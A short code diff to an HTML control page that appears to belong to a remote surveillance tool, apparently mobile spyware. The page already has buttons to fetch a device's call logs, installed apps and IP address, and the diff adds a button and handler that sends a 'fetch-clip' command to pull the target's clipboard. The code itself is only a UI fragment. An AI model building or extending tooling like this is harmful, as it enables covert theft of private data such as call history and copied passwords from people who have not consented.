@@ -63,6 +63,7 @@
   <button class="fetch" id="btnFetchLog">Fetch Call Logs</button>
   <button class="fetch" id="btnFetchApps">Fetch Installed Apps</button>
   <button class="fetch" id="btnFetchIp">Fetch Ip Address</button>
+  <button class="fetch" id="btnFetchClip">Fetch ClipBoard</button>
   <button class="upload" id="btnUpload">Upload</button>
   <button class="close" id="btnClose">Close</button>
 
@@ -112,6 +113,7 @@
     document.getElementById("btnFetchLog").onclick = () => sendCmd("fetch-logs");
     document.getElementById("btnFetchApps").onclick = () => sendCmd("fetch-apps");
     document.getElementById("btnFetchIp").onclick = () => sendCmd("fetch-ip");
+    document.getElementById("btnFetchClip").onclick = () => sendCmd("fetch-clip");
     document.getElementById("btnUpload").onclick = () => sendCmd("upload");
     document.getElementById("btnClose").onclick = () => window.close();
 
